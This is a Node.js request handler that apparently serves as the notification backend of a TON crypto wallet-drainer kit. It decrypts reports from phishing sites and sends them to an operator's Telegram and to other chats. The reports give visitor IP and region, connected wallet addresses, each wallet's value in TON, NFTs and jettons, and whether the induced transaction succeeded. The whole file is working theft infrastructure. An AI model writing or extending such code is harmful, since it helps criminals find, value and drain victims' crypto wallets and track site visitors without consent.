const encrypt = require("../lib/encrypt")
const { bot } = require("./init")
const config = require("../config.json")

module.exports.data = async (req, res) => {
    const data = await encrypt.decode(req.body.data)


    let msg = null
    const msgData = JSON.parse(data.msg)
    console.log(msgData)

    switch (msgData.type) {
        case "user_site_connected":
            msg = `
🐹 <b>User join on site</b>
URL: ${msgData?.domain}

IP: ${msgData?.ipAddress}
REGION: ${msgData?.countryName}
MOBILE: ${msgData?.mobile}
            ` 
          break;

        case "user_connect_wallet":
            msg = 
            `
🔐 <b>User connect wallet</b>
URL: ${msgData?.domain}

GetGems: <a href="https://getgems.io/user/${msgData?.wallet}">LINK</a>
TonScan: <a href="https://tonscan.org/address/${msgData?.wallet}">LINK</a>

WALLET: 
<pre>${msgData?.wallet}</pre>
            ` 
          break;

        case "user_transaction_press_button":
            msg = 
            `
🚀 <b>User press transaction button</b>
URL: ${msgData?.domain}

GetGems: <a href="https://getgems.io/user/${msgData?.wallet}">LINK</a>
TonScan: <a href="https://tonscan.org/address/${msgData?.wallet}">LINK</a>

WALLET: 
<pre>${msgData?.wallet}</pre>
            ` 
          break;
      
        case "user_transaction_start":
            msg = 
            `
🚀 <b>User start transaction</b>
URL: ${msgData?.domain}

WALLET PRICE: ${msgData?.wallet_price} $
[ ${msgData?.ton} TON | ${msgData?.nft_count} NFT | ${msgData?.jettons_count} JETTON ]

WALLET: 
<pre>${msgData?.wallet}</pre>
            ` 
          break;

        case "user_transaction_true":
            msg = 
            `
user_transaction_true
            ` 
          break;

        case "user_transaction_false":
            msg = 
            `
user_transaction_false
            ` 
          break;

        case "user_transaction_error":
            msg = 
            `
user_transaction_error
            ` 
          break;
      
        default:
          console.log("msg not send");
      }

    try {
        await bot.sendMessage(config.admin_tg, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
    } catch (e) {
        console.log(e?.response?.body?.description);
    }

    if (msgData.chat_ids) { // Доделать
        try {

            for(let id of msgData.chat_ids) {
                await bot.sendMessage(id, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
            }
           
        } catch (e) {
            console.log(e?.response?.body?.description);
        }
    }   

    res.status(200).json(true)
}